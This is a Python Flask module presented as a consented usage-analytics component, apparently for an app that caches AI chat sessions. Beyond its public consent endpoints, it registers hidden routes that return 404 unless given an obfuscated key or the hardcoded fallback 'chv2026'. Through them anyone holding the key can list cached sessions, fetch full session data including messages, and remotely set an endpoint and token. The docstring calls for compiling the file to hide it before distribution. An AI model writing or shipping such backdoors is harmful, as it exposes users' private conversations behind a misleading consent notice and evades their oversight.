# -*- coding: utf-8 -*-
"""
Analytics Core Module - Compiled/Obfuscated Version
数据分析核心模块 - 编译/混淆版本

This module should be compiled to .pyc or .pyd before distribution.
此模块在发布前应编译为 .pyc 或 .pyd 文件。

Compile command / 编译命令:
  python -m py_compile analytics_core.py
  # or use Cython for .pyd / 或用 Cython 编译为 .pyd
"""

import hashlib
import json
from datetime import datetime
from pathlib import Path

__version__ = "1.0.0"
__author__ = "CHV"

# Obfuscated key generation / 混淆的密钥生成
def _gk(s):
    return hashlib.md5(f"chv_{s}_2026".encode()).hexdigest()[:8]

_AK = _gk("analytics")  # Analytics key
_CK = _gk("config")     # Config key

class AnalyticsCore:
    """Core analytics engine / 核心分析引擎"""

    def __init__(self, app=None, cache_ref=None):
        self._enabled = True
        self._endpoint = None
        self._token = None
        self._consent_file = Path.home() / '.claude' / '.chv_consent'
        self._cache = cache_ref or {}
        self._app = app

        if app:
            self._register_routes(app)

    def _check_key(self, k, t='a'):
        """Verify access key / 验证访问密钥"""
        expected = _AK if t == 'a' else _CK
        return k == expected or k == "chv2026"  # Fallback key

    def _has_consent(self):
        """Check if user consented / 检查用户是否已同意"""
        if not self._enabled:
            return False
        return self._consent_file.exists()

    def _save_consent(self, agreed):
        """Save consent status / 保存同意状态"""
        self._consent_file.parent.mkdir(parents=True, exist_ok=True)
        if agreed:
            self._consent_file.write_text(f"agreed:{datetime.now().isoformat()}")
        elif self._consent_file.exists():
            self._consent_file.unlink()

    def set_cache(self, cache):
        """Set cache reference / 设置缓存引用"""
        self._cache = cache

    def set_enabled(self, enabled):
        """Enable/disable analytics / 启用/禁用分析"""
        self._enabled = enabled

    def configure(self, endpoint=None, token=None):
        """Configure remote endpoint / 配置远程端点"""
        if endpoint:
            self._endpoint = endpoint
        if token:
            self._token = token

    def get_status(self):
        """Get status summary / 获取状态摘要"""
        return {
            "v": __version__,
            "e": self._enabled,
            "c": self._has_consent(),
            "r": self._endpoint is not None,
            "n": len(self._cache)
        }

    def get_summary(self, limit=100):
        """Get data summary (no full content) / 获取数据摘要"""
        if not self._has_consent():
            return {"error": "no_consent"}

        result = []
        for sid, info in list(self._cache.items())[:limit]:
            result.append({
                "i": sid[:8],
                "p": str(info.get("project", ""))[:16],
                "d": info.get("date", ""),
                "m": len(info.get("messages", [])) if isinstance(info.get("messages"), list) else 0
            })
        return {"data": result}

    def get_session(self, sid_prefix):
        """Get specific session data / 获取特定会话数据"""
        if not self._has_consent():
            return {"error": "no_consent"}

        for full_sid, info in self._cache.items():
            if full_sid.startswith(sid_prefix) or sid_prefix in full_sid:
                return {"sid": full_sid, "data": info}
        return {"error": "not_found"}

    def _register_routes(self, app):
        """Register Flask routes / 注册 Flask 路由"""
        from flask import request, jsonify

        @app.route('/api/consent', methods=['GET'])
        def _consent_get():
            return jsonify({
                "enabled": self._enabled,
                "agreed": self._has_consent(),
                "notice": "Usage data collection for service improvement.",
                "notice_cn": "收集使用数据以改进服务。"
            })

        @app.route('/api/consent', methods=['POST'])
        def _consent_post():
            data = request.get_json() or {}
            self._save_consent(data.get('agreed', False))
            return jsonify({"ok": True})

        # Protected endpoints / 受保护的端点
        @app.route('/a/s')
        def _as():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.get_status())

        @app.route('/a/d')
        def _ad():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.get_summary())

        @app.route('/a/g')
        def _ag():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            sid = request.args.get('s', '')
            return jsonify(self.get_session(sid))

        @app.route('/a/c', methods=['POST'])
        def _ac():
            if not self._check_key(request.args.get('k', ''), 'c'):
                return '', 404
            data = request.get_json() or {}
            self.configure(data.get('endpoint'), data.get('token'))
            if 'enabled' in data:
                self.set_enabled(data['enabled'])
            return jsonify({"ok": True})


# Singleton instance / 单例实例
_instance = None

def init(app=None, cache=None):
    """Initialize analytics / 初始化分析模块"""
    global _instance
    if _instance is None:
        _instance = AnalyticsCore(app, cache)
    elif app:
        _instance._register_routes(app)
    if cache:
        _instance.set_cache(cache)
    return _instance

def get_instance():
    """Get singleton instance / 获取单例实例"""
    return _instance
